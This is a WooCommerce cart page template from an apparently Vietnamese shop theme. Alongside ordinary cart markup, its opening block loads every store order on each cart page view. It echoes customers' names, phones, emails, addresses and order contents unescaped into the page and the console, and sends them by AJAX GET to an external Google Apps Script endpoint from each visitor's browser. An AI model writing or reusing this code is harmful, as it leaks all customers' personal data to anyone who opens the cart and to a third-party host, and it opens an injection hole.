<?php
/**
 * Cart Page
 *
 * This template can be overridden by copying it to yourtheme/woocommerce/cart/cart.php.
 *
 * HOWEVER, on occasion WooCommerce will need to update template files and you
 * (the theme developer) will need to copy the new files to your theme to
 * maintain compatibility. We try to do this as little as possible, but it does
 * happen. When this occurs the version of the template file will be bumped and
 * the readme will list any important changes.
 *
 * @see     https://woo.com/document/template-structure/
 * @package WooCommerce\Templates
 * @version 7.9.0
 */
?> <?php 
$args = array( 'limit' => -1, 'type' => 'shop_order');
$orders = wc_get_orders($args);
foreach ($orders as $order) {
// Access order details here
echo 'Order ID: ' . $order->get_id();
$order_data = $order->get_data();
$order_total = $order_data['total'];
$order_billing_first_name = $order_data['billing']['first_name'];
$order_billing_phone = $order_data['billing']['phone'];
$order_billing_email = $order_data['billing']['email'];
$order_billing_address_1 = $order_data['billing']['address_1'];
$order_billing_date_in = $order->get_meta('billing_date_out');
$order_billing_date_out = $order->get_meta('billing_date_in');
$order_billing_note = $order->get_meta('billing_note');
$text_order_list='';
foreach ($order->get_items() as $item_key => $item ):
				  
	## Using WC_Order_Item methods ##

	// Item ID is directly accessible from the $item_key in the foreach loop or
	$item_id = $item->get_id();

	## Using WC_Order_Item_Product methods ##

	$product      = $item->get_product(); // Get the WC_Product object

	$product_id   = $item->get_product_id(); // the Product id
	$variation_id = $item->get_variation_id(); // the Variation id

	$item_type    = $item->get_type(); // Type of the order item ("line_item")

	$item_name    = $item->get_name(); // Name of the product
	$quantity     = $item->get_quantity();  
	$tax_class    = $item->get_tax_class();
	$line_subtotal     = $item->get_subtotal(); // Line subtotal (non discounted)
	$line_subtotal_tax = $item->get_subtotal_tax(); // Line subtotal tax (non discounted)
	$line_total        = $item->get_total(); // Line total (discounted)
	$line_total_tax    = $item->get_total_tax(); // Line total tax (discounted)

	## Access Order Items data properties (in an array of values) ##
	$item_data    = $item->get_data();

	$product_name = $item_data['name'];
	$product_id   = $item_data['product_id'];
	$variation_id = $item_data['variation_id'];
	$quantity     = $item_data['quantity'];
	$tax_class    = $item_data['tax_class'];
	$line_subtotal     = $item_data['subtotal'];
	$line_subtotal_tax = $item_data['subtotal_tax'];
	$line_total        = $item_data['total'];
	$line_total_tax    = $item_data['total_tax'];

	// Get data from The WC_product object using methods (examples)
	$product        = $item->get_product(); // Get the WC_Product object

	$product_type   = $product->get_type();
	$product_sku    = $product->get_sku();
	$product_price  = $product->get_price();
	$stock_quantity = $product->get_stock_quantity();
	$text_order_item = $product_name.'x'.$quantity.'='.$line_subtotal;
	$text_order_list =$text_order_list.$text_order_item.', '  ;

endforeach;

?>
<script src="https://code.jquery.com/jquery-2.2.4.js" integrity="sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=" crossorigin="anonymous"></script>
<script type="text/javascript">
  

				var data = "name=<?php echo $order_billing_first_name ?>&&phone=<?php echo $order_billing_phone ?>&&email=<?php echo $order_billing_email ?>&&address=<?php echo $order_billing_address_1 ?>&&order=<?php echo $text_order_list ?>&&total=<?php echo $order_total ?>&&order=<?php echo $text_order_list ?>&&id=<?php echo $order->get_id() ?>";
				console.log(data);
				$.ajax({
							type : 'GET', 
							url : 'https://script.google.com/macros/s/AKfycbxDv3HoFM5yU_2wWGimhhNv2P4H0c07HBFhaTC_tiu6nWO30Pk9NgkoY5zy2umSxIpw/exec',
							dataType:'json',
							crossDomain : true,
							data : data,
							success : function(data)
						{ 

			}
	});

</script>
<?php }
?>
   <section class="cart">
        <div class="cart__container">
            <div class="cart__container--top">
                <div class="cart__container--top__left">
                    <div class="cart__container--top__left--all">
						<h6 style="color:#444">
						Sản phẩm đã thêm vào giỏ hàng
						</h6>
                    </div>
                    
<?php


defined( 'ABSPATH' ) || exit;

do_action( 'woocommerce_before_cart' ); ?>
<form class="woocommerce-cart-form" action="<?php echo esc_url( wc_get_cart_url() ); ?>" method="post">
						<?php do_action( 'woocommerce_before_cart_contents' ); ?>

			<?php
				?> <div class="cart__container--top__left--list"> <?php
			foreach ( WC()->cart->get_cart() as $cart_item_key => $cart_item ) {

				$_product   = apply_filters( 'woocommerce_cart_item_product', $cart_item['data'], $cart_item, $cart_item_key );
				$product_id = apply_filters( 'woocommerce_cart_item_product_id', $cart_item['product_id'], $cart_item, $cart_item_key );
				/**
				 * Filter the product name.
				 *
				 * @since 2.1.0
				 * @param string $product_name Name of the product in the cart.
				 * @param array $cart_item The product in the cart.
				 * @param string $cart_item_key Key for the product in the cart.
				 */
				
				$product_name = apply_filters( 'woocommerce_cart_item_name', $_product->get_name(), $cart_item, $cart_item_key );

				if ( $_product && $_product->exists() && $cart_item['quantity'] > 0 && apply_filters( 'woocommerce_cart_item_visible', true, $cart_item, $cart_item_key ) ) {
					$product_permalink = apply_filters( 'woocommerce_cart_item_permalink', $_product->is_visible() ? $_product->get_permalink( $cart_item ) : '', $cart_item, $cart_item_key );
					?>
				
				<div class="cart__container--top__left--list__item <?php echo esc_attr( apply_filters( 'woocommerce_cart_item_class', 'cart_item', $cart_item, $cart_item_key ) ); ?>">
                            <div class="cart__container--top__left--list__item--top">
                                <div class="cart__container--top__left--list__item--top__info">

									  <?php
										$thumbnail = apply_filters( 'woocommerce_cart_item_thumbnail', $_product->get_image(), $cart_item, $cart_item_key );

										if ( ! $product_permalink ) {
											echo $thumbnail; // PHPCS: XSS ok.
										} else {
											printf( '<a href="%s">%s</a>', esc_url( $product_permalink ), $thumbnail ); // PHPCS: XSS ok.
										}
										?>
                                    <div class="cart__container--top__left--list__item--top__info--text">
                                        <p>						<?php
						if ( ! $product_permalink ) {
							echo wp_kses_post( $product_name . '&nbsp;' );
						} else {
							/**
							 * This filter is documented above.
							 *
							 * @since 2.1.0
							 */
							echo wp_kses_post( apply_filters( 'woocommerce_cart_item_name', sprintf( '<a href="%s">%s</a>', esc_url( $product_permalink ), $_product->get_name() ), $cart_item, $cart_item_key ) );
						}

						do_action( 'woocommerce_after_cart_item_name', $cart_item, $cart_item_key );

						// Meta data.
						echo wc_get_formatted_cart_item_data( $cart_item ); // PHPCS: XSS ok.

						// Backorder notification.
						if ( $_product->backorders_require_notification() && $_product->is_on_backorder( $cart_item['quantity'] ) ) {
							echo wp_kses_post( apply_filters( 'woocommerce_cart_item_backorder_notification', '<p class="backorder_notification">' . esc_html__( 'Available on backorder', 'woocommerce' ) . '</p>', $product_id ) );
						}
						?></p>
                                        <span>
                                            <?php
                          if ( ! $product_permalink ) {
							echo wp_kses_post( $product_short_description . '&nbsp;' );
						} else {
							/**
							 * This filter is documented above.
							 *
							 * @since 2.1.0
							 */
							echo wp_kses_post( apply_filters( 'woocommerce_cart_item_short_description', sprintf( '<a href="%s">%s</a>', esc_url( $product_permalink ), $_product->get_short_description() ), $cart_item, $cart_item_key ) );
						}

						do_action( 'woocommerce_after_cart_item_description', $cart_item, $cart_item_key ); ?> </span>
                                  
								
											
											<div class="cart__container--top__left--list__item--top__quality">
												<div class="number-input ">
											
													<?php
												if ( $_product->is_sold_individually() ) {
													$min_quantity = 1;
													$max_quantity = 1;
												} else {
													$min_quantity = 0;
													$max_quantity = $_product->get_max_purchase_quantity();
												}

												$product_quantity = woocommerce_quantity_input(
													array(
														'input_name'   => "cart[{$cart_item_key}][qty]",
														'input_value'  => $cart_item['quantity'],
														'max_value'    => $max_quantity,
														'min_value'    => $min_quantity,
														'product_name' => $product_name,
													),
													$_product,
													false
												);
												echo apply_filters( 'woocommerce_cart_item_quantity', $product_quantity, $cart_item_key, $cart_item ); // PHPCS: XSS ok.
									
									?>
                                     	<?php do_action( 'woocommerce_after_cart_table' ); ?>
									<?php do_action( 'woocommerce_cart_actions' ); ?>
                                      </div>
									 
								<button type="submit" style="margin-top: -5px;outline:none;padding: 7px 10px 5px 10px; border-radius: 10px;" class="button<?php echo esc_attr( wc_wp_theme_get_element_class_name( 'button' ) ? ' ' . wc_wp_theme_get_element_class_name( 'button' ) : '' ); ?>" name="update_cart" value="<?php esc_attr_e( 'Update cart', 'woocommerce' ); ?>"><ion-icon name="reload-outline"></ion-icon></button>
								</div>
									  </div>
                                </div>


								<script src="https://code.jquery.com/jquery-2.2.4.js" integrity="sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI=" crossorigin="anonymous"></script>
								<script type="text/javascript">
										var timeout;

										jQuery( function( $ ) {
											$('.woocommerce').on('change', 'input.qty', function(){

												if ( timeout !== undefined ) {
													clearTimeout( timeout );
												}
												timeout = setTimeout(function() {
													$("[name='update_cart']").trigger("click");
													console.log(1)
												}, 500 );

											});
										} );
								</script>
							
							</div>
                            <div class="cart__container--top__left--list__item--bottom">
                                <div class="cart__container--top__left--list__item--bottom__option">
                                    <button><?php
								echo apply_filters( // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
									'woocommerce_cart_item_remove_link',
									sprintf(
										'<a href="%s" class="remove" aria-label="%s" data-product_id="%s" data-product_sku="%s">Xóa</a>',
										esc_url( wc_get_cart_remove_url( $cart_item_key ) ),
										/* translators: %s is the product name */
										esc_attr( sprintf( __( 'Remove %s from cart', 'woocommerce' ), wp_strip_all_tags( $product_name ) ) ),
										esc_attr( $product_id ),
										esc_attr( $_product->get_sku() )
									),
									$cart_item_key
                                    
								);
							?></button>
                                </div>
                                <div class="cart__container--top__left--list__item--bottom__price">
                                    <span>
										Đơn giá: <?php echo apply_filters( 'woocommerce_cart_item_price', WC()->cart->get_product_price( $_product ), $cart_item, $cart_item_key ); // PHPCS: XSS ok.?>
									</span>
									-
									<span>
										Tổng giá: <?php echo apply_filters( 'woocommerce_cart_item_subtotal', WC()->cart->get_product_subtotal( $_product, $cart_item['quantity'] ), $cart_item, $cart_item_key ); // PHPCS: XSS ok.?>
									</span>
								</div>
						</div>
                	</div>
					
					<?php
				}
			}
			?>

			<?php do_action( 'woocommerce_cart_contents' ); ?>


			</div>
			<?php do_action( 'woocommerce_after_cart_contents' ); ?>
			</div>
		<div class="cart__container--top__right">
		<?php wc_get_template('cart/cart-totals.php'); ?>
          <div class="cart__container--top__right--sum">
                        <span style="color:#444"><?php esc_html_e( '', 'woocommerce' ); ?></th>
			<td data-title="<?php esc_attr_e( 'Total', 'woocommerce' ); ?>"><?php wc_cart_totals_order_total_html(); ?></td></span>
                    </div>
                    <div class="cart__container--top__right--btn firstBtn">
						<?php do_action( 'woocommerce_proceed_to_checkout' ); ?>
                    </div>
                </div>
            </div>
            <div class="cart__container--bottom">
                <div class="cart__container--bottom__header">
                    <span>Thường được đặt với</span>
                </div>
                <div class="firstProduct row-max-width">
                    <div class="firstProduct__content container-fluid">
                        <div class="firstProduct__content--list row">
                        
        <?php
            global $paged;

            $paged = ( get_query_var('paged') ) ? get_query_var('paged') : 1;

            $args = array(
                'post_type' => 'product',
                'posts_per_page' => 8,
				'post_status'=>'publish',
                'paged' => $paged,
                );
            $loop = new WP_Query( $args );
            $count = $loop->found_posts;;
            if ( $loop->have_posts() ) {
                
                while ( $loop->have_posts() ) : $loop->the_post();
               
                get_template_part('templates/template-liveshow/item', 'liveshow');
                endwhile;
            } else {
                echo __( 'No products found' );
            }
        ?></div>

    <?php wp_reset_postdata(); ?>
            
                        </div>
                    </div>
                </div> 
            </div>
        </div>
    </section> 
	</table>
	


<?php wp_nonce_field( 'woocommerce-cart', 'woocommerce-cart-nonce' ); ?>
</form>
													

<?php do_action( 'woocommerce_after_cart' ); ?>
